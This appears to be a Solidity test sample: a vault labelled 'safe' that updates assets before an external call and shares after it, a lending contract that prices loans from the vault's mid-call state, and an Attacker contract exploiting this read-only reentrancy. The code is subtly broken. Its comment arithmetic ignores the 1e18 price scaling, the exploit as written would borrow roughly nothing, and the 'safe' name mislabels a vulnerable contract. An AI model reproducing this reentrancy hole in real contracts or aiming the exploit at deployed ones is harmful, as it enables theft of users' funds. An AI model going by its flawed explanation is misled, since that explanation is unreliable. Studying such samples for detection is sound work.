// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract ReadOnlyLend_safe1 {
    uint public assets;
	uint public shares;

    function withdraw(uint amt) external {
        require(assets >= amt);
        assets -= amt;	// updated BEFORE the external call
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
        shares -= amt;	// updated AFTER the external call
    }

	function deposit() external payable {
		assets += msg.value;
		shares += msg.value;
	}

    function getPrice() public view returns (uint) {
        return assets * 1e18 / shares;
    }

}

contract ReadOnlyLend_safe1_Lending {
    ReadOnlyLend_safe1 public immutable vault;

    constructor(address v) {
        vault = ReadOnlyLend_safe1(v);
    }

    function borrow(uint amt) external {
        uint256 out = amt / vault.getPrice();
		(bool ok,) = msg.sender.call{value: out}("");
		require(ok);
    }
}


contract Attacker {
    ReadOnlyLend_safe1 public vault;
    ReadOnlyLend_safe1_Lending public lending;

    constructor(address v, address l) {
        vault = ReadOnlyLend_safe1(v);
        lending = ReadOnlyLend_safe1_Lending(l);
    }

    function attack() external {
		vault.deposit{value:100 ether}();
        vault.withdraw(50 ether);	// pps = 50 / 100 = 0.5
    }

    receive() external payable {
        lending.borrow(100);	// borrows 100 / 0.5 = 200 shares, which is more than the 100 shares deposited, therefore this is profitable
    }
}